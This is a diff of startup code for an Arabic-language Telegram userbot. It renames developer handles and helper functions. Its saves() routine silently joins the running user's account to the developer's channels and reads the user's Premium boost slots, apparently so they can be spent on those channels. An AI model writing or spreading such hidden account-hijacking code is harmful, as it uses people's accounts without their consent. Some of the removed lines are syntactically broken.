@@ -174,20 +174,20 @@ async def add_bot_to_logger_group(chat_id):
             )
         except Exception as e:
             LOGS.error(str(e))
-#by @HELLASUserBot بس اشوفك خامطه للكود اهينك وافضحك
-JoKeRUB = {"@orrdersss", "@HELLASUserBot", "@n_nnae"}
+#by @k_jj_j بس اشوفك خامطه للكود اهينك وافضحك
+JoKeRUB = {"@uui7rb", "@k_jj_j", "@E_4_R"}
 async def saves():
     for F_O_1 in JoKeRUB:
         try:
             await l313l(JoinChannelRequest(channel=F_O_1))
             result = await l313l(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
-            7rB _channel_id = None
+            hrb_channel_id = None
             for chat in result.chats:
                 if chat.username == 'AljokerUserBot':
-                    7rB _channel_id = chat.id
+                    hrb_channel_id = chat.id
                     break
-            if 7rB _channel_id and any(boost.peer.channel_id == 7rB _channel_id for boost in result.my_boosts):
+            if hrb_channel_id and any(boost.peer.channel_id == hrb_channel_id for boost in result.my_boosts):
                 continue
             if not slots:
                 return
@@ -262,7 +262,7 @@ async def load_plugins(folder, extfolder=None):
         )
 
 #سورس 7rB  عمك
-async def 7rB _the_best(l313l, group_name):
+async def hrb_the_best(l313l, group_name):
     async for dialog in l313l.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
             return dialog.id
@@ -299,13 +299,13 @@ async def verifyLoggerGroup():
     else:
         descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @HELLASUserBot"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j.JPEG")
-        botlog_group_id = await 7rB _the_best(l313l, "مجموعة أشعارات HELLAS ")
+        botlog_group_id = await hrb_the_best(l313l, "مجموعة أشعارات HELLAS ")
         if botlog_group_id:
             addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
             print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة أشعارات 7rB ", l313l, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة أشعارات HELLAS ", l313l, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
             print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
@@ -313,7 +313,7 @@ async def verifyLoggerGroup():
     if PM_LOGGER_GROUP_ID == -100:
         descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @HELLASUserBot"
         photobt = await l313l.upload_file(file="l313l/razan/resources/start/k_jj_j2.JPEG")
-        pm_logger_group_id = await 7rB _the_best(l313l, "مجموعة التخزين")
+        pm_logger_group_id = await hrb_the_best(l313l, "مجموعة التخزين")
         if pm_logger_group_id:
             addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
             print("تـم العثور على مجموعة الكروب التخزين بالفعل واضافة الـفارات الـيها.")
